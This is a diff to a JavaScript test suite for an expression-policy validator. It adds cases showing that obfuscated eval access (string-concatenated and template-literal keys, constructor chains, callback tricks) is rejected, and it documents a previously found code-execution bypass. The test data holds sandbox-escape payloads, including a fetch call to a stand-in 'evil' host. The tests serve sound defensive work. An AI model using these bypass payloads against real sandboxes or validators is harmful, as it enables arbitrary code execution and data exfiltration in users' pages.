@@ -158,6 +158,120 @@ describe('AC4: FIX-4 dynamic computed member keys no longer truncate the chain',
   })
 })
 
+/**
+ * Fix round 3 (NEW-P0). FIX-4 constant folding was wired into `propertyKeyName()`
+ * and the `Reflect.get` branch only, NOT into `memberName()` — the single name
+ * resolution entry used by the WRITE_APIS check and the member-chain walk. So
+ * the same member chain passed or failed depending only on HOW the key was
+ * spelled: `[1].map(window['eval'])` was rejected while
+ * `[1].map(window['ev'+'al'])` (value/callback position) was accepted, giving
+ * `eval` as a forEach/map callback → arbitrary code execution in the page.
+ * These cases MUST fail on the pre-fix code (recorded: 11 ACCEPT / 0 REJECT).
+ */
+describe('AC4b: NEW-P0 folded computed keys in VALUE position are rejected', () => {
+  it.each([
+    [`[1].map(window['ev'+'al'])`, 'concatenated key as a callback (eval)'],
+    [`["payload"].forEach(window['ev'+'al'])`, 'concatenated key as forEach callback (eval)'],
+    [`["alert(1)"].map(window['ev'+'al'])`, 'eval executes an attacker string'],
+    [`["fetch(\\"https://evil\\")"].map(window['ev'+'al'])`, 'eval + network egress payload'],
+    [`[1].map(window['e'+'v'+'al'])`, 'three-part concatenation'],
+    [`[1].map(window['op'+'en'])`, 'folded WRITE_APIS member (open)'],
+    [`[1].map(document['wri'+'te'])`, 'folded document.write'],
+    [`['k'].forEach(localStorage['set'+'Item'])`, 'folded localStorage.setItem'],
+    [`['https://evil'].forEach(location['ass'+'ign'])`, 'folded location.assign'],
+    [`[1].map(("")['con'+'structor']['con'+'structor'])`, 'folded constructor chain as a callback'],
+    [`[1].map(window['con'+'structor']['con'+'structor'])`, 'folded window.constructor chain'],
+    [`[1].map(window?.['ev'+'al'])`, 'optional chain + folded key'],
+    [`[1].map((0, window['ev'+'al']))`, 'sequence expression + folded key'],
+    [`[1].map([window['ev'+'al']][0])`, 'array element + folded key'],
+    ['[1].map(window[`ev${"a"}l`])', 'template-literal key'],
+    ['[1].map(("")[`con${"s"}tructor`][`con${"s"}tructor`])', 'template-literal constructor chain'],
+  ])('AC4b rejects %s (%s)', (expression) => {
+    expectEvalPolicyError(expression)
+  })
+})
+
+describe('AC3d: FIX-4b regression — folded/harmless computed keys still allowed', () => {
+  it.each([
+    `window['__NEXT'+'_DATA__']`,
+    `data[key]`,
+    `window[key]`,
+    `document['querySel'+'ector']('#a')`,
+    `fetch('u', { body: data[key] })`,
+    `[1,2].map(n => data[n])`,
+    `[1,2].map(n => window['__NEXT'+'_DATA__'])`,
+  ])('AC3d accepts %s', (expression) => {
+    expect(() => validateEvalExpression(expression)).not.toThrow()
+  })
+})
+
+/**
+ * D-2 (fix round 3): the property-name blacklist is base-agnostic (DECIDED D6),
+ * so idioms that REUSE a blacklisted property name are rejected as collateral.
+ * Design doc §4.5.1 registers the nine classes; these tests make the claim
+ * machine-checked in both directions: the registered classes must stay
+ * rejected (a change to ACCEPT means the blacklist was weakened = security
+ * regression), and the listed alternatives must stay allowed (a change to
+ * REJECT means over-rejection).
+ */
+describe('D-2: registered collateral rejections (property-name reuse)', () => {
+  it.each([
+    [`Object.prototype.hasOwnProperty.call({}, 'x')`, '1: call trampoline'],
+    [`Array.prototype.slice.call([1,2])`, '2: call trampoline'],
+    [`''.constructor.name`, '3: constructor chain'],
+    [`[].constructor`, '4: constructor chain'],
+    [`[1,2].constructor`, '4: constructor chain (non-empty array)'],
+    [`fn.apply(null, [1])`, '5: apply trampoline'],
+    [`fn.bind(null)`, '5: bind trampoline'],
+    [`Object.getOwnPropertyDescriptor({}, 'x')`, '6: descriptor .value reaches Function'],
+    [`x?.constructor`, '7: optional chain does not exempt'],
+    [`Object.prototype.toString.call({})`, '8: prototype + call'],
+    [`Object.prototype.hasOwnProperty`, '8: prototype'],
+    [`({}).__proto__`, '9: __proto__'],
+  ])('D-2 rejects %s (%s)', (expression) => {
+    expectEvalPolicyError(expression)
+  })
+
+  it.each([
+    `Object.keys({})`,
+    `Array.isArray([])`,
+    `Object.getPrototypeOf({})`,
+    `JSON.parse('{}')`,
+    `[1,2].slice(1)`,
+    `Object.freeze({})`,
+    `x instanceof Object`,
+    `typeof x`,
+    `data[key]`,
+    `window['__NEXT'+'_DATA__']`,
+  ])('D-2 keeps the documented alternative allowed: %s', (expression) => {
+    expect(() => validateEvalExpression(expression)).not.toThrow()
+  })
+})
+
+describe('D-1: shared child-walk refactor keeps every composite value covered', () => {
+  it.each([
+    [`[1].map(true ? setTimeout : null)`, 'conditional consequent'],
+    [`[1].map(false ? null : alert)`, 'conditional alternate'],
+    [`[1].map(1 ? setTimeout : 2)`, 'conditional with literal test'],
+    [`({f: true ? setTimeout : null}).f('1')`, 'conditional inside a property value'],
+    [`({f: true && setTimeout}).f('1')`, 'logical AND'],
+    [`({f: setTimeout || null}).f('1')`, 'logical OR'],
+    [`[1].map((0, setTimeout))`, 'sequence'],
+    [`[1].map([setTimeout][0])`, 'array element'],
+    [`[1].map(!setTimeout ? 1 : 2)`, 'unary inside a conditional test'],
+  ])('D-1 rejects %s (%s)', (expression) => {
+    expectEvalPolicyError(expression)
+  })
+
+  it.each([
+    `[1].map(true ? (x=>x) : null)`,
+    `[1].map(true ? 1 : 2)`,
+    `({f: true ? 'a' : 'b'}).f`,
+  ])('D-1 accepts %s', (expression) => {
+    expect(() => validateEvalExpression(expression)).not.toThrow()
+  })
+})
+
 describe('AC3b: FIX-3 scoped bindings — legit callback/alias calls stay allowed (regression)', () => {
   it.each([
     `[() => 1].map(f => f())`,
